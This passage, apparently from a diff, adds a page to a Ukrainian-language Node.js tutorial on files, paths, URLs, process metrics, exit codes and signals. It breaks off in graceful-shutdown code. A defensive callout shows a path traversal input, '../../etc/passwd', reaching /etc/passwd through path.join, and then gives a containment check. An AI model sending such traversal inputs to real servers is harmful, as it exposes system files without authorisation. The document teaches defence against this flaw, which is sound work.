+      <p class="section-desc">readFile тримає весь файл у пам'яті; file descriptor — це лічильний ресурс ОС, і він закінчується.</p>
+
+      <p><code>readFile</code> виділяє Buffer розміром із файл (максимум — близько 2–4 GB, і ще менше, якщо просите рядок).
+      Для файлів, розмір яких ви не контролюєте (аплоади, логи, експорти), використовуйте стріми — вимір пам'яті й рецепти є в
+      <a href="06-events-streams-buffers.html">туторіалі 6</a>. Правило: <b>конфіги й маленькі JSON — readFile; все, що
+      надходить від користувачів або росте з часом, — stream</b>.</p>
+
+      <h3>File descriptors</h3>
+      <p>Кожен відкритий файл, сокет, pipe — це <b>файловий дескриптор</b> (ціле число в таблиці процесу). 0, 1, 2 — stdin,
+      stdout, stderr. Ліміт на процес (<code>ulimit -n</code>) часто 1024 або 10 240 → якщо відкривати і не закривати —
+      отримаєте <code>EMFILE: too many open files</code>.</p>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">filehandle.mjs</span></div>
+        <pre><code>import { open } from 'node:fs/promises';
+
+const fh = await open('out/config.json', 'r');     // FileHandle — обгортка над fd
+try {
+  console.log('fd:', fh.fd);                          // число, &gt; 2
+  const { bytesRead, buffer } = await fh.read(Buffer.alloc(4), 0, 4, 1); // 4 байти з позиції 1
+  console.log(bytesRead, buffer.toString());          // 4 '"v":'
+  for await (const line of fh.readLines()) { /* ... */ }
+} finally {
+  await fh.close();                                   // ЗАВЖДИ закривати
+}
+
+// Node 24+ / TS 5.2+: explicit resource management
+// await using fh = await open('file.txt');           // close() викличеться сам при виході з блоку</code></pre>
+      </div>
+      <ul>
+        <li>Прапори <code>open</code>: <code>'r'</code>, <code>'w'</code> (створити/обрізати), <code>'a'</code> (дописати),
+        <code>'wx'</code> (створити, <b>помилка якщо існує</b> — простий lock-файл), <code>'r+'</code>.</li>
+        <li>FileHandle, який зібрав GC незакритим, Node закриє сам і видасть warning — але покладатися на це не можна.</li>
+        <li>Масовий <code>Promise.all(files.map(readFile))</code> на 50 000 файлів = EMFILE. Обмежуйте конкурентність
+        (<code>p-limit</code> або пачками).</li>
+      </ul>
+
+      <div class="callout bad"><div class="ic">🐛</div><div class="body"><b>TOCTOU:</b>
+      <code>if (fs.existsSync(p)) fs.readFileSync(p)</code> — між перевіркою і дією файл можуть видалити. Правильно: просто
+      робити операцію й обробляти <code>err.code === 'ENOENT'</code>. Помилки fs мають <code>code</code>
+      (<code>ENOENT</code>, <code>EACCES</code>, <code>EEXIST</code>, <code>EISDIR</code>, <code>EMFILE</code>),
+      <code>syscall</code> і <code>path</code>.</div></div>
+    </section>
+
+    <section id="s3">
+      <h2><span class="num">03</span> Атомарні записи і робота з деревами</h2>
+      <p class="section-desc">writeFile не атомарний: падіння посеред запису лишить напівфайл. Класичне рішення — temp + rename.</p>
+
+      <p><code>writeFile('config.json', data)</code> спочатку обрізає файл до 0, потім пише. Якщо процес вбили (OOM,
+      деплой, SIGKILL) між цими кроками — на диску порожній або обрізаний JSON, і наступний старт падає на парсингу.
+      Рішення: записати в тимчасовий файл <b>у тій самій директорії</b> і зробити <code>rename</code> — на POSIX
+      файлових системах це атомарна заміна: читач бачить або старий файл, або новий, ніколи — половину.</p>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">atomic-write.mjs</span></div>
+        <pre><code>import { open, rename } from 'node:fs/promises';
+import { randomUUID } from 'node:crypto';
+import path from 'node:path';
+
+async function writeFileAtomic(file, data) {
+  // та сама директорія = та сама ФС; rename між ФС не атомарний (EXDEV)
+  const tmp = path.join(path.dirname(file), `.${path.basename(file)}.${randomUUID()}.tmp`);
+  const fh = await open(tmp, 'w');
+  try {
+    await fh.writeFile(data);
+    await fh.sync();            // fsync: дані на диску, а не лише в page cache
+  } finally {
+    await fh.close();
+  }
+  await rename(tmp, file);      // атомарна заміна
+}
+
+await writeFileAtomic('out/config.json', JSON.stringify({ v: 1 }));</code></pre>
+      </div>
+      <p class="muted">Для абсолютної надійності після rename ще роблять fsync директорії; на практиці цим займається
+      бібліотека <code>write-file-atomic</code> (її використовує npm). Windows: rename поверх відкритого іншим процесом файлу
+      може дати <code>EPERM</code> — бібліотеки роблять retry.</p>
+
+      <h3>Дерева: mkdir, cp, rm, readdir</h3>
+      <div class="codecard">
+        <div class="bar"><span class="path">trees.mjs</span></div>
+        <pre><code>import { mkdir, cp, rm, readdir } from 'node:fs/promises';
+
+await mkdir('out/a/b/c', { recursive: true });       // як mkdir -p; повторно — без EEXIST
+await cp('out', 'out-copy', { recursive: true });     // як cp -r (стабільний з Node 22)
+console.log((await readdir('out-copy', { recursive: true })).sort());
+// [ 'a', 'a/b', 'a/b/c', 'config.json' ]
+
+await rm('out-copy', { recursive: true, force: true }); // як rm -rf
+await rm('does-not-exist', { recursive: true, force: true }); // force: без ENOENT
+try { await rm('out/a'); } catch (e) { console.log(e.code); }  // ERR_FS_EISDIR
+
+// glob вбудований у свіжих версіях: for await (const f of glob('src/**/*.ts')) ...</code></pre>
+      </div>
+      <div class="callout warn"><div class="ic">⚠️</div><div class="body"><code>rm(path, { recursive: true, force: true })</code>
+      зі шляхом, зібраним з користувацьких даних або змінних середовища — це той самий <code>rm -rf $DIR/</code> з порожньою
+      змінною. Перевіряйте, що шлях лежить усередині очікуваної директорії (див. path traversal у s5).</div></div>
+    </section>
+
+    <section id="s4">
+      <h2><span class="num">04</span> fs.watch: чому це важко</h2>
+      <p class="section-desc">Стеження за файлами виглядає як один виклик, але поводиться по-різному на кожній ОС.</p>
+
+      <table>
+        <tr><th></th><th><code>fs.watch</code></th><th><code>fs.watchFile</code></th></tr>
+        <tr><td>Механізм</td><td>нативні події ОС: inotify (Linux), FSEvents/kqueue (macOS), ReadDirectoryChangesW (Windows)</td><td>polling: <code>stat()</code> кожні N мс</td></tr>
+        <tr><td>Швидкодія</td><td>миттєво, дешево</td><td>CPU і затримка до інтервалу</td></tr>
+        <tr><td>Надійність</td><td>залежить від ОС і ФС</td><td>працює скрізь, навіть у мережевих ФС</td></tr>
+      </table>
+
+      <h3>Відомі пастки fs.watch</h3>
+      <ul>
+        <li><b>Дублікати подій</b>: одне збереження в редакторі дає 2–4 події (<code>'rename'</code> + кілька <code>'change'</code>),
+        бо редактори пишуть у temp-файл і роблять rename (той самий атомарний патерн з s3!). Потрібен debounce.</li>
+        <li><code>filename</code> у колбеку <b>може бути null</b> на деяких платформах.</li>
+        <li>Якщо файл замінили через rename, watcher на старому inode може "осліпнути" — дивіться за директорією, не за файлом.</li>
+        <li><code>recursive: true</code> історично працював лише на macOS/Windows; на Linux з'явився в новіших версіях, але
+        на великих деревах впирається в ліміт inotify watchers (<code>fs.inotify.max_user_watches</code>).</li>
+        <li>Docker-volume з хоста macOS/Windows, NFS, SMB — події часто не доходять узагалі; доводиться вмикати polling.</li>
+      </ul>
+      <div class="codecard">
+        <div class="bar"><span class="path">watch.mjs</span></div>
+        <pre><code>import { watch } from 'node:fs/promises';
+
+const ac = new AbortController();
+let timer;
+for await (const { eventType, filename } of watch('./config', { signal: ac.signal })) {
+  clearTimeout(timer);
+  timer = setTimeout(() =&gt; reload(filename), 100);   // debounce дублікатів
+}</code></pre>
+      </div>
+      <p>Тому інструменти розробки (Vite, webpack, nodemon) використовують <code>chokidar</code> або власні шари з
+      нормалізацією, а вбудований <code>node --watch</code> (s13) достатній для перезапуску сервера. У продакшені для
+      "hot reload конфігу" надійніше сигнал (<code>SIGHUP</code>) або періодичне перечитування, ніж watcher.</p>
+    </section>
+
+    <section id="s5">
+      <h2><span class="num">05</span> path: join vs resolve</h2>
+      <p class="section-desc">join склеює сегменти, resolve будує абсолютний шлях "як cd справа наліво". Плутанина між ними — джерело багів і вразливостей.</p>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">path.js</span></div>
+        <pre><code>const path = require('node:path');
+
+path.join('/app', 'src', '../config', 'db.json');     // '/app/config/db.json'
+path.resolve('/app', 'src', '../config', 'db.json');  // '/app/config/db.json'  (те саме — бо почали з абсолютного)
+
+path.join('a', '/b', 'c');      // 'a/b/c'   ← '/b' просто ще один сегмент
+path.resolve('a', '/b', 'c');   // '/b/c'    ← абсолютний сегмент "скидає" все зліва
+
+path.join('uploads', 'img.png');      // 'uploads/img.png'  — відносний, як був
+path.resolve('uploads', 'img.png');   // process.cwd() + '/uploads/img.png'  — завжди абсолютний
+
+path.normalize('/a//b/../c/./d');                       // '/a/c/d'
+path.relative('/app/src/routes', '/app/config/db.json'); // '../../config/db.json'
+path.parse('/home/u/report.tar.gz');
+// { root: '/', dir: '/home/u', base: 'report.tar.gz', ext: '.gz', name: 'report.tar' }
+path.extname('archive.tar.gz');               // '.gz'  (лише останнє розширення)
+path.basename('/x/y/file.txt', '.txt');       // 'file'</code></pre>
+      </div>
+
+      <figure class="diagram">
+        <svg viewBox="0 0 740 280" role="img" aria-label="path.join склеює всі сегменти зліва направо через роздільник і нормалізує результат, тому join('a', '/b', 'c') дає a/b/c. path.resolve обробляє сегменти справа наліво, як послідовність cd, і зупиняється на першому абсолютному сегменті; якщо абсолютного немає, додає process.cwd(). Тому resolve('a', '/b', 'c') дає /b/c.">
+          <defs><marker id="n07d1-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker></defs>
+          <g font-size="12">
+            <text x="20" y="28" fill="var(--accent)" font-weight="bold">path.join('a', '/b', 'c') — склеїти зліва направо</text>
+            <rect x="20" y="42" width="70" height="34" rx="6" fill="none" stroke="currentColor" stroke-width="1.2"/>
+            <text x="55" y="64" text-anchor="middle" fill="currentColor">'a'</text>
+            <rect x="120" y="42" width="70" height="34" rx="6" fill="none" stroke="currentColor" stroke-width="1.2"/>
+            <text x="155" y="64" text-anchor="middle" fill="currentColor">'/b'</text>
+            <rect x="220" y="42" width="70" height="34" rx="6" fill="none" stroke="currentColor" stroke-width="1.2"/>
+            <text x="255" y="64" text-anchor="middle" fill="currentColor">'c'</text>
+            <line x1="90" y1="59" x2="118" y2="59" stroke="currentColor" stroke-width="1.2" marker-end="url(#n07d1-arrow)"/>
+            <line x1="190" y1="59" x2="218" y2="59" stroke="currentColor" stroke-width="1.2" marker-end="url(#n07d1-arrow)"/>
+            <line x1="290" y1="59" x2="350" y2="59" stroke="currentColor" stroke-width="1.2" marker-end="url(#n07d1-arrow)"/>
+            <text x="420" y="54" text-anchor="middle" fill="currentColor">'a' + '/' + '/b' + '/' + 'c'</text>
+            <text x="420" y="72" text-anchor="middle" fill="var(--fg-muted)">→ normalize</text>
+            <rect x="520" y="42" width="120" height="34" rx="6" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.3"/>
+            <text x="580" y="64" text-anchor="middle" fill="var(--accent)">'a/b/c'</text>
+            <text x="655" y="64" fill="var(--fg-muted)">відносний</text>
+
+            <text x="20" y="130" fill="var(--good)" font-weight="bold">path.resolve('a', '/b', 'c') — справа наліво, як cd, до першого абсолютного</text>
+            <rect x="20" y="146" width="70" height="34" rx="6" fill="none" stroke="var(--fg-muted)" stroke-width="1.2" stroke-dasharray="4,3"/>
+            <text x="55" y="168" text-anchor="middle" fill="var(--fg-muted)">'a' ✗</text>
+            <rect x="120" y="146" width="70" height="34" rx="6" fill="var(--accent-soft)" stroke="var(--good)" stroke-width="1.5"/>
+            <text x="155" y="168" text-anchor="middle" fill="var(--good)">'/b' ■</text>
+            <rect x="220" y="146" width="70" height="34" rx="6" fill="none" stroke="var(--good)" stroke-width="1.2"/>
+            <text x="255" y="168" text-anchor="middle" fill="var(--good)">'c'</text>
+            <path d="M255,182 C240,210 170,210 158,184" fill="none" stroke="var(--good)" stroke-width="1.2" marker-end="url(#n07d1-arrow)"/>
+            <text x="205" y="222" text-anchor="middle" fill="var(--good)">1. 'c' 2. '/b' — абсолютний, стоп</text>
+            <line x1="290" y1="163" x2="510" y2="163" stroke="currentColor" stroke-width="1.2" marker-end="url(#n07d1-arrow)"/>
+            <rect x="520" y="146" width="120" height="34" rx="6" fill="var(--accent-soft)" stroke="var(--good)" stroke-width="1.3"/>
+            <text x="580" y="168" text-anchor="middle" fill="var(--good)">'/b/c'</text>
+            <text x="655" y="168" fill="var(--fg-muted)">абсолютний</text>
+
+            <text x="20" y="252" fill="var(--warn)">Немає абсолютного сегмента? resolve('uploads', 'x.png') → process.cwd() + '/uploads/x.png'</text>
+            <text x="20" y="270" fill="var(--warn)">— результат залежить від того, з якої директорії запустили процес!</text>
+          </g>
+        </svg>
+        <figcaption>join — "склеїти й прибрати зайве", resolve — "де я опинюсь, якщо виконаю cd по кожному сегменту справа наліво".</figcaption>
+      </figure>
+
+      <h3>cwd ≠ директорія скрипта</h3>
+      <p><code>path.resolve('data.json')</code> і <code>fs.readFile('data.json')</code> рахуються від <code>process.cwd()</code> —
+      директорії, з якої запустили процес, а не від файлу з кодом. <code>cd / &amp;&amp; node /app/server.js</code> — і відносні шляхи
+      зламалися. Шляхи до своїх ресурсів будуйте від <code>__dirname</code> (CJS) або <code>import.meta.dirname</code> (ESM, s6).</p>
+
+      <h3>posix vs win32</h3>
+      <p><code>path</code> за замовчуванням працює за правилами поточної ОС. Явно: <code>path.posix.join</code> (для URL,
+      S3-ключів, zip-архівів — завжди <code>/</code>), <code>path.win32.join('C:\\app', 'src')</code> → <code>C:\app\src</code>.
+      <code>path.sep</code> — <code>/</code> чи <code>\</code>; <code>path.delimiter</code> — роздільник у <code>PATH</code>
+      (<code>:</code> чи <code>;</code>). Не будуйте шляхи конкатенацією рядків з <code>'/'</code>, якщо код має працювати на Windows.</p>
+
+      <div class="callout bad"><div class="ic">🔓</div><div class="body"><b>Path traversal:</b>
+      <code>path.join('/srv/files', req.query.name)</code> з <code>name = '../../etc/passwd'</code> дає
+      <code>'/etc/passwd'</code>. join нормалізує <code>..</code>, а не захищає від них. Правильна перевірка:
+      <pre><code>const root = path.resolve('/srv/files');
+const target = path.resolve(root, userInput);
+if (!target.startsWith(root + path.sep)) throw new Error('forbidden');</code></pre>
+      Детальніше — <a href="14-security.html">туторіал 14</a>.</div></div>
+    </section>
+
+    <section id="s6">
+      <h2><span class="num">06</span> URL і file:// шляхи</h2>
+      <p class="section-desc">У ESM модулі ідентифікуються URL-ами, тому конвертація URL ↔ шлях — щоденна операція.</p>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">urls.mjs</span></div>
+        <pre><code>import { fileURLToPath, pathToFileURL } from 'node:url';
+
+import.meta.url;                       // 'file:///app/src/index.js'
+import.meta.dirname;                   // '/app/src'      (Node 20.11+ / 21.2+)
+import.meta.filename;                  // '/app/src/index.js'
+
+// старий спосіб (і для старіших Node):
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+
+fileURLToPath('file:///tmp/my%20dir/a.txt');     // '/tmp/my dir/a.txt'  — декодує %20
+pathToFileURL('/tmp/my dir/#a.txt').href;        // 'file:///tmp/my%20dir/%23a.txt' — екранує # і пробіл
+new URL('./data.json', import.meta.url);         // ресурс поруч із модулем (fs приймає URL напряму)
+
+const u = new URL('https://api.example.com:8080/v1/orders?status=new&amp;page=2#top');
+u.hostname; u.port; u.pathname;                  // 'api.example.com' '8080' '/v1/orders'
+u.searchParams.get('page');                      // '2'
+u.searchParams.append('q', 'кава &amp; чай');
+u.search; // '?status=new&amp;page=2&amp;q=%D0%BA%D0%B0%D0%B2%D0%B0+%26+%D1%87%D0%B0%D0%B9'</code></pre>
+      </div>
+      <div class="callout warn"><div class="ic">⚠️</div><div class="body">Не робіть <code>new URL(import.meta.url).pathname</code>
+      як шлях: він лишить <code>%20</code> замість пробілів і дасть <code>/C:/...</code> на Windows. Тільки <code>fileURLToPath</code>.
+      І не використовуйте застарілий <code>url.parse()</code> — він нестрогий і мав проблеми безпеки; WHATWG <code>URL</code> —
+      стандарт.</div></div>
+    </section>
+
+    <section id="s7">
+      <h2><span class="num">07</span> process: середовище й метрики</h2>
+      <p class="section-desc">Глобальний об'єкт process — інтерфейс до вашого ОС-процесу: аргументи, змінні, ресурси, ідентичність.</p>
+
+      <table>
+        <tr><th>Властивість</th><th>Що це</th><th>Нюанс</th></tr>
+        <tr><td><code>process.argv</code></td><td><code>[execPath, script, ...args]</code></td><td>аргументи користувача — з <code>argv.slice(2)</code>; парсинг — <code>util.parseArgs</code> (s12)</td></tr>
+        <tr><td><code>process.env</code></td><td>змінні середовища</td><td><b>завжди рядки</b>: <code>process.env.PORT = 3000</code> → <code>'3000'</code>; <code>'false'</code> — truthy!</td></tr>
+        <tr><td><code>process.cwd()</code> / <code>chdir()</code></td><td>поточна директорія</td><td><code>chdir</code> впливає на весь процес (і недоступний у worker threads)</td></tr>
+        <tr><td><code>process.pid</code>, <code>ppid</code></td><td>id процесу і батька</td><td>в Docker без init ваш процес — PID 1 (s9)</td></tr>
+        <tr><td><code>process.platform</code>, <code>arch</code></td><td><code>'linux'</code>, <code>'darwin'</code>, <code>'win32'</code>; <code>'x64'</code>, <code>'arm64'</code></td><td><code>win32</code> і на 64-бітній Windows</td></tr>
+        <tr><td><code>process.versions</code></td><td>версії node, v8, uv, openssl...</td><td>напр. <code>{ node: '24.18.0', v8: '13.6...', uv: '1.52.1' }</code></td></tr>
+        <tr><td><code>process.execPath</code></td><td>шлях до бінарника node</td><td>для <code>spawn(process.execPath, ...)</code> — той самий Node</td></tr>
+        <tr><td><code>process.uptime()</code></td><td>секунди з старту процесу</td><td>для health-check</td></tr>
+        <tr><td><code>process.memoryUsage()</code></td><td><code>rss, heapTotal, heapUsed, external, arrayBuffers</code></td><td>RSS — уся пам'ять процесу; Buffer-и — в external (<a href="15-performance-memory.html">туторіал 15</a>)</td></tr>
+        <tr><td><code>process.cpuUsage(prev?)</code></td><td><code>{ user, system }</code> у мікросекундах</td><td>передайте попередній результат, щоб отримати дельту</td></tr>
+        <tr><td><code>process.hrtime.bigint()</code></td><td>наносекунди, монотонний годинник</td><td>для вимірів; <code>Date.now()</code> може стрибати (NTP)</td></tr>
+      </table>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">measure.js</span></div>
+        <pre><code>const t0 = process.hrtime.bigint();
+const c0 = process.cpuUsage();
+doWork();
+const ms = Number(process.hrtime.bigint() - t0) / 1e6;    // BigInt − BigInt, потім у Number
+const cpu = process.cpuUsage(c0);                         // дельта: { user, system } мкс
+console.log({ wallMs: ms, cpuMs: (cpu.user + cpu.system) / 1000 });
+// wall ≫ cpu → чекали I/O; wall ≈ cpu → CPU-bound; cpu &gt; wall → кілька потоків (GC, threadpool)</code></pre>
+      </div>
+
+      <div class="callout warn"><div class="ic">⚠️</div><div class="body">Читайте <code>process.env</code> <b>один раз</b>
+      при старті в типізований конфіг з валідацією (<a href="13-typescript-validation-config.html">туторіал 13</a>), а не
+      розкидайте <code>process.env.X</code> по коду: (1) доступ до env відносно повільний (це не звичайний об'єкт, а обгортка
+      над середовищем ОС), (2) помилка в назві змінної вилізе в рантаймі на рідкісному шляху, а не на старті.</div></div>
+    </section>
+
+    <section id="s8">
+      <h2><span class="num">08</span> Життєвий цикл і коди виходу</h2>
+      <p class="section-desc">Node-процес завершується сам, коли event loop порожній. process.exit() обриває це на півслові — і може загубити дані.</p>
+
+      <figure class="diagram">
+        <svg viewBox="0 0 740 330" role="img" aria-label="Життєвий цикл процесу Node. Після виконання головного модуля працює event loop. Коли не лишилось активних handles і запитів, емітиться beforeExit; якщо слухач запланував нову роботу, loop продовжується. Інакше емітиться exit з кодом process.exitCode, де можна виконувати лише синхронний код, і процес завершується. Виклик process.exit() з будь-якого місця одразу переходить до події exit, пропускаючи beforeExit і незавершені асинхронні операції. Неперехоплений виняток іде в uncaughtException; без обробника процес завершується з кодом 1.">
+          <defs><marker id="n07d2-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker></defs>
+          <g font-size="12">
+            <rect x="20" y="30" width="150" height="44" rx="8" fill="none" stroke="currentColor" stroke-width="1.3"/>
+            <text x="95" y="57" text-anchor="middle" fill="currentColor">Головний модуль</text>
+            <rect x="220" y="30" width="170" height="44" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.3"/>
+            <text x="305" y="50" text-anchor="middle" fill="var(--accent)">Event loop</text>
+            <text x="305" y="66" text-anchor="middle" fill="var(--fg-muted)">поки є handles/запити</text>
+            <rect x="440" y="30" width="130" height="44" rx="8" fill="none" stroke="var(--info)" stroke-width="1.3"/>
+            <text x="505" y="57" text-anchor="middle" fill="var(--info)">'beforeExit'</text>
+            <rect x="610" y="30" width="110" height="44" rx="8" fill="none" stroke="var(--good)" stroke-width="1.3"/>
+            <text x="665" y="50" text-anchor="middle" fill="var(--good)">'exit'(code)</text>
+            <text x="665" y="66" text-anchor="middle" fill="var(--fg-muted)">лише sync</text>
+            <line x1="170" y1="52" x2="216" y2="52" stroke="currentColor" stroke-width="1.3" marker-end="url(#n07d2-arrow)"/>
+            <line x1="390" y1="52" x2="436" y2="52" stroke="currentColor" stroke-width="1.3" marker-end="url(#n07d2-arrow)"/>
+            <text x="413" y="22" text-anchor="middle" fill="var(--fg-muted)">порожньо</text>
+            <line x1="570" y1="52" x2="606" y2="52" stroke="currentColor" stroke-width="1.3" marker-end="url(#n07d2-arrow)"/>
+            <path d="M505,76 C505,115 305,115 305,78" fill="none" stroke="var(--info)" stroke-width="1.2" stroke-dasharray="4,3" marker-end="url(#n07d2-arrow)"/>
+            <text x="405" y="122" text-anchor="middle" fill="var(--info)">слухач запланував нову роботу → loop живе далі</text>
+            <line x1="665" y1="74" x2="665" y2="160" stroke="currentColor" stroke-width="1.3" marker-end="url(#n07d2-arrow)"/>
+            <rect x="590" y="164" width="140" height="40" rx="8" fill="var(--bg-soft)" stroke="currentColor" stroke-width="1.3"/>
+            <text x="660" y="189" text-anchor="middle" fill="currentColor">ОС: код виходу</text>
+
+            <rect x="20" y="160" width="230" height="44" rx="8" fill="none" stroke="var(--warn)" stroke-width="1.5"/>
+            <text x="135" y="180" text-anchor="middle" fill="var(--warn)">process.exit(n) будь-де</text>
+            <text x="135" y="196" text-anchor="middle" fill="var(--fg-muted)">pending I/O, таймери — відкинуто</text>
+            <path d="M250,172 C480,172 590,140 625,78" fill="none" stroke="var(--warn)" stroke-width="1.3" marker-end="url(#n07d2-arrow)"/>
+            <text x="420" y="190" text-anchor="middle" fill="var(--warn)">без beforeExit</text>
+
+            <rect x="20" y="250" width="230" height="44" rx="8" fill="none" stroke="var(--bad)" stroke-width="1.5"/>
+            <text x="135" y="270" text-anchor="middle" fill="var(--bad)">throw / unhandled rejection</text>
+            <text x="135" y="286" text-anchor="middle" fill="var(--fg-muted)">ніхто не зловив</text>
+            <rect x="300" y="250" width="200" height="44" rx="8" fill="none" stroke="var(--bad)" stroke-width="1.3"/>
+            <text x="400" y="270" text-anchor="middle" fill="var(--bad)">'uncaughtException'</text>
+            <text x="400" y="286" text-anchor="middle" fill="var(--fg-muted)">є слухач? процес живе</text>
+            <line x1="250" y1="272" x2="296" y2="272" stroke="var(--bad)" stroke-width="1.3" marker-end="url(#n07d2-arrow)"/>
+            <path d="M500,272 C580,272 640,250 655,208" fill="none" stroke="var(--bad)" stroke-width="1.3" marker-end="url(#n07d2-arrow)"/>
+            <text x="590" y="300" text-anchor="middle" fill="var(--bad)">немає слухача → exit 1</text>
+          </g>
+        </svg>
+        <figcaption>Природне завершення: loop порожній → beforeExit → exit. process.exit() і неперехоплені винятки "перестрибують" нормальний шлях.</figcaption>
+      </figure>
+
+      <h3>beforeExit vs exit</h3>
+      <div class="task">
+        <div class="task-head"><span class="tasknum">Задача 1</span><span class="taskdiff mid">Середньо</span><span class="tasktitle">Скільки разів beforeExit?</span></div>
+        <div class="codecard"><div class="bar"><span class="path">task-1.js</span></div><pre><code>process.on('beforeExit', (code) =&gt; {
+  console.log('beforeExit', code);
+  if (!globalThis.done) {
+    globalThis.done = true;
+    setTimeout(() =&gt; console.log('extra work scheduled in beforeExit'), 10);
+  }
+});
+process.on('exit', (code) =&gt; {
+  console.log('exit', code);
+  setTimeout(() =&gt; console.log('never'), 0);
+});
+console.log('main done');
+process.exitCode = 3;</code></pre></div>
+        <details class="answer"><summary></summary><div class="a-body"><span class="out">main done
+beforeExit 3
+extra work scheduled in beforeExit
+beforeExit 3
+exit 3</span><p><code>beforeExit</code> емітиться щоразу, коли loop спорожнів. Перший раз ми запланували таймер —
+        loop ожив, виконав його і знову спорожнів → другий <code>beforeExit</code>. Тепер нічого не заплановано →
+        <code>exit</code> з кодом з <code>process.exitCode</code> (3, <code>echo $?</code> теж покаже 3). Таймер у
+        <code>exit</code> ніколи не спрацює: після цієї події loop вже не крутиться.</p></div></details>
+      </div>
+      <p>Якщо замість цього викликати <code>process.exit(0)</code> одразу після <code>setTimeout</code> — побачите лише
+      <code>exit 0</code>: ні таймера, ні <code>beforeExit</code> (перевірено).</p>
+
+      <h3>Чому exitCode, а не exit()</h3>
+      <div class="codecard">
+        <div class="bar"><span class="path">exit-truncation.sh</span></div>
+        <pre><code>$ node -e "process.stdout.write('x'.repeat(5e6)); process.exit(0)" | wc -c
+  131072          # ← загубили 4.87 MB виводу!
+$ node -e "process.stdout.write('x'.repeat(5e6)); process.exitCode = 0" | wc -c
+ 5000000</code></pre>
+      </div>
+      <p>Коли stdout — pipe (а в Docker/Kubernetes логи йдуть саме в pipe), запис у нього <b>асинхронний</b>.
+      <code>process.exit()</code> завершує процес, не дочекавшись, поки буфер зіллється, — і хвіст логів, включно з
+      повідомленням про помилку, зникає. <code>process.exitCode = n</code> лише встановлює код, а процес завершиться
+      природно, коли все дописано і всі ресурси закриті. Правило: <b><code>exit()</code> — лише як аварійний "force exit" за таймаутом</b>
+      (див. graceful shutdown у s9).</p>
+
+      <h3>uncaughtException і unhandledRejection</h3>
+      <div class="codecard">
+        <div class="bar"><span class="path">uncaught.js</span></div>
+        <pre><code>process.on('uncaughtException', (err, origin) =&gt; {
+  console.log('caught:', err.message, '| origin:', origin);
+  process.exitCode = 1;
+});
+process.on('exit', (c) =&gt; console.log('exit', c));
+setTimeout(() =&gt; { throw new Error('boom in timer'); }, 0);
+Promise.reject(new Error('rejected promise'));
+
+// caught: rejected promise | origin: unhandledRejection   ← з Node 15 rejection → exception
+// caught: boom in timer | origin: uncaughtException
+// exit 1</code></pre>
+      </div>
+      <ul>
+        <li>З Node 15 <code>--unhandled-rejections=throw</code> за замовчуванням: неперехоплений rejection стає
+        <code>uncaughtException</code> і без обробника валить процес з кодом 1. Якщо є слухач <code>'unhandledRejection'</code> —
+        процес <b>не</b> падає (перевірено: "still alive").</li>
+        <li><code>uncaughtException</code> — <b>не</b> спосіб "продовжити роботу". Після невідомого винятку стан процесу
+        невизначений (недозакриті транзакції, зламані інваріанти). Правильно: залогувати, віддати метрику, почати graceful
+        shutdown і дати оркестратору (k8s, PM2) підняти новий процес.</li>
+        <li>Для спостереження без зміни поведінки є <code>'uncaughtExceptionMonitor'</code>.</li>
+      </ul>
+
+      <h3>Конвенції кодів виходу</h3>
+      <table>
+        <tr><th>Код</th><th>Значення</th></tr>
+        <tr><td>0</td><td>успіх</td></tr>
+        <tr><td>1</td><td>загальна помилка; Node ставить 1 при uncaught exception</td></tr>
+        <tr><td>2</td><td>неправильне використання CLI (Unix-конвенція; bash builtins)</td></tr>
+        <tr><td>9</td><td>Node: invalid argument (напр. невідомий прапор)</td></tr>
+        <tr><td>13</td><td>Node: unsettled top-level await (ESM чекав на проміс, який ніколи не розрішився)</td></tr>
+        <tr><td>128 + N</td><td>вбито сигналом N: 130 = SIGINT (Ctrl+C), 137 = SIGKILL (часто OOM killer у k8s), 143 = SIGTERM</td></tr>
+      </table>
+      <div class="callout interview"><div class="ic">💼</div><div class="body"><span class="tag">На співбесіді запитають так</span>
+      "Pod у Kubernetes рестартиться з exit code 137 — що це?" — 128 + 9 = SIGKILL. Найчастіше OOMKilled (перевищено memory limit;
+      підтвердити в <code>kubectl describe pod</code>) або процес не завершився за <code>terminationGracePeriodSeconds</code> після SIGTERM.</div></div>
+    </section>
+
+    <section id="s9">
+      <h2><span class="num">09</span> Сигнали, stdio і graceful shutdown</h2>
+      <p class="section-desc">Деплой без втрати запитів = правильна реакція на SIGTERM. Це питання, яке перевіряє реальний продакшен-досвід.</p>
+
+      <table>
+        <tr><th>Сигнал</th><th>Хто надсилає</th><th>Можна перехопити?</th><th>Поведінка Node за замовчуванням</th></tr>
+        <tr><td><code>SIGINT</code></td><td>Ctrl+C у терміналі</td><td>так</td><td>завершення (130)</td></tr>
+        <tr><td><code>SIGTERM</code></td><td><code>kill</code>, Docker stop, k8s, systemd</td><td>так</td><td>завершення (143)</td></tr>
+        <tr><td><code>SIGKILL</code></td><td><code>kill -9</code>, OOM killer, k8s після grace period</td><td><b>ні</b></td><td>миттєва смерть, жодного коду</td></tr>
+        <tr><td><code>SIGHUP</code></td><td>закрили термінал; часто "перечитай конфіг"</td><td>так</td><td>завершення</td></tr>
+        <tr><td><code>SIGUSR1</code></td><td>—</td><td>зарезервований Node</td><td>вмикає інспектор (debugger)</td></tr>
+        <tr><td><code>SIGUSR2</code></td><td>nodemon, PM2</td><td>так</td><td>використовується тулами для перезапуску</td></tr>
+      </table>
+      <p>Спроба <code>process.on('SIGKILL', ...)</code> кидає <code>EINVAL</code> (перевірено) — ядро не дає процесу шансу.
+      Тому все важливе має бути зроблено <i>до</i> SIGKILL: у вікні між SIGTERM і закінченням grace period.</p>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">graceful.js</span></div>
+        <pre><code>const http = require('node:http');
+const server = http.createServer((req, res) =&gt; res.end('ok')).listen(3000);
+
+let shuttingDown = false;
+function shutdown(signal) {
